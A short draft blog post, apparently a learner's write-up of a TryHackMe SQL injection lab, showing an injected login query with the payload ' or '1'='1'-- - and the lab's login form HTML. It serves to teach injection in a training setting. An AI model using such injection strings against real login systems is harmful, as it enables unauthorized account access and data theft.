---
author: "Thao"
title: "My first hacking challenge CHAP.3: SQL Injection - POST Injection "

date: "2023-03-24"
summary: "POST Injection"
tags: [
    "sql",
    "hacking",
    "My-first-hacking-challenge",
]
toc: false
draft: true
thumbnail: "https://brightsec.com/wp-content/uploads/elementor/thumbs/image_13-pktx6jgimwsiva0x6ilsesl4obl7e2qbi52gyoay2o.png"
---

Welcome back to my post with the third chap about SQL Injection challenge on tryhackme.

## Third chap - fourth task
1. Environment Setup.

[Check at chap 1](https://whatisthaodoing.today/post/my-first-hacking-challenge-sql-injection-chap.1/)

```sql
SELECT uid, name, profileID, salary, passportNr, email, nickName, password FROM usertable WHERE profileID='1' or '1'='1'-- -' AND password='a665a45920422f9d417e4867efdc4fb8a04a1f3fff1fa07e998e86f7f7a27ae3'
```

<img src="/sql-injection-img/p2/Challenge-room-all-task-4.png" width="100%"/>

task 4

```html
<form action="/sesqli4/login" onsubmit="return validateform()" name="inputForm" method="POST">
        <h2 class="text-center">Log in</h2>
        <div class="form-group">
            <input type="text" class="form-control" placeholder="ProfileID" required="required" name="profileID">
        </div>
        <div class="form-group">
            <input type="password" class="form-control" placeholder="Password" required="required" name="password">
        </div>
        <div class="form-group">
            <button type="submit" class="btn btn-primary btn-block">Log in</button>
        </div>
    </form>
```

